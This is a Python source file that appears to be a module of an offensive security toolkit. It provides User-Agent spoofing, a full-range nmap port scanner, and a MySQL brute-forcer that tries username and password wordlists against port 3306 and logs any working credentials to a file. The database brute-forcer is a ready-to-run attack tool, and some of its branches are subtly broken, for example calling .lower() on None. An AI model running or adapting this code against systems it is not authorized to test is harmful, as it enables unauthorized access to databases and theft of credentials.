#!/usr/bin/env python
# _*_ coding: utf-8 _*_
from fake_useragent import UserAgent
import time
import urllib
import nmap
import requests
import pymysql


def IpProcess(Url):
    if Url.startswith("http"):  # 记个小知识点：必须带上https://这个头不然urlparse就不能正确提取hostname导致后面运行出差错
        res = urllib.parse.urlparse(Url)  # 小知识点2：如果只导入import urllib包使用parse这个类的话会报错，必须在import requests导入这个包才能正常运行
    else:
        res = urllib.parse.urlparse('http://%s' % Url)
    return (res.hostname)

class WriteFile:#写入文件类
    def __init__(self,FileName):
        if FileName == None:
            self.FileName = time.strftime("%Y-%m-%d", time.localtime())  # 获取日期作为文件
        else:
            self.FileName = FileName


    def Write(self,Medusa):
        FileNames = self.FileName + ".txt"#不需要输入后缀，只要名字就好
        with open(FileNames, 'a',encoding='utf-8') as f:  # 如果filename不存在会自动创建， 'w'表示写数据，写之前会清空文件中的原有数据！
               f.write(Medusa+ "\n")



class UserAgentS:#使用随机头类
    def __init__(self,Values):
        self.Values=Values

    def UserAgent(self):#使用随机头传入传入参数
        try:
            ua = UserAgent()
            if self.Values.lower()==None:#如果参数为空使用随机头
                return (ua.random)
            elif self.Values.lower()=="firefox":#如果是火狐字符串使用火狐头
                return (ua.firefox)
            elif self.Values.lower()=="ie":#IE浏览器
                return (ua.ie)
            elif self.Values.lower()=="msie":#msie
                return (ua.msie)
            elif self.Values.lower()=="opera":#Opera Software
                return (ua.opera)
            elif self.Values.lower()=="chrome":#谷歌浏览器
                return (ua.chrome)
            elif self.Values.lower()=="AppleWebKit":#AppleWebKit
                return (ua.google)
            elif self.Values.lower()=="Gecko":#Gecko
                return (ua.ff)
            elif self.Values.lower()=="safari":#apple safari
                return (ua.safari)
            else:
                return (ua.random)#如果用户瞎几把乱输使用随机头
        except:
            ua = UserAgent()
            return (ua.random)#报错使用随机头


class NmapScan:#扫描端口类
    def __init__(self,Url,Port):
        Host=IpProcess(Url)#调用IP处理函数
        self.Host= Host#提取后的网址或者IP
        if Port==None:
            self.Port = "1-65535"#如果用户没输入就扫描全端口
        else:
            self.Port=Port
    def ScanPort(self):
        try:
            Nmap = nmap.PortScanner()
            ScanResult = Nmap.scan(self.Host, self.Port, '-sV')
            FinalResults = "IP:" + self.Host + "\rPort status:\r"
            for list in ScanResult['scan'][self.Host]['tcp']:
                FinalResults = FinalResults + "Port:" + str(list) + "     Status:Open\r"  # list为每个tcp列表的值(但是tcp列表里面还有值)
            NmapScanFileName = "NmapScanOutputFile.txt"
            with open(NmapScanFileName, 'a', encoding='utf-8') as f:
                f.write(FinalResults + "\n")#写入单独的扫描结果文件中
        except:
            print("Please enter the correct nmap scan command.")


class BlastingDB:
    def __init__(self,DataBaseUserFileName,DataBasePasswrodFileName):
        self.DataBaseUserFileName=DataBaseUserFileName
        self.DataBasePasswrodFileName = DataBasePasswrodFileName
    def BoomDB(self,Url):
        try:
            if self.DataBaseUserFileName!=None and self.DataBasePasswrodFileName!=None:
                with open(self.DataBaseUserFileName, encoding='utf-8') as f:
                    for UserLine in f:
                        User = UserLine
                        with open(self.DataBasePasswrodFileName, encoding='utf-8') as f:
                            for PassWrodLine in f:
                                PassWrod = PassWrodLine
                                try:
                                    Url=IpProcess(Url)
                                    conn = pymysql.connect(Url, User, PassWrod, 'mysql', 3306)
                                    conn.close()
                                    BoomDBFileName = "BoomDBOutputFile.txt"
                                    with open(BoomDBFileName, 'a', encoding='utf-8') as f:
                                        f.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
                                except Exception as e:
                                    pass
        except:
            print("Input file content format is incorrect")
        try:
            if self.DataBaseUserFileName == None or self.DataBasePasswrodFileName==None:
                with open("/Dictionary/MysqlUser.txt", encoding='utf-8') as f:
                    for UserLine in f:
                        User = UserLine
                        with open("/Dictionary/MysqlPassWrod.txt", encoding='utf-8') as f:
                            for PassWrodLine in f:
                                PassWrod = PassWrodLine
                                try:
                                    Url = IpProcess(Url)
                                    conn = pymysql.connect(Url, User, PassWrod, 'mysql', 3306)
                                    conn.close()
                                    BoomDBFileName = "BoomDBOutputFile.txt"
                                    with open(BoomDBFileName, 'a', encoding='utf-8') as f:
                                        f.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
                                except Exception as e:
                                    pass
        except:
            print("Input file content format is incorrect")





# a=UBlastingDB("")
# b=a.UserAgent()
# print(b)
